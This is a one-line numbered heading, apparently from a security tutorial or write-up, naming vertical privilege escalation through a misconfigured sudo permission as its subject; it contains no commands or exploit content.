4. Vertical privilege escalation via misconfigurated Sudo permission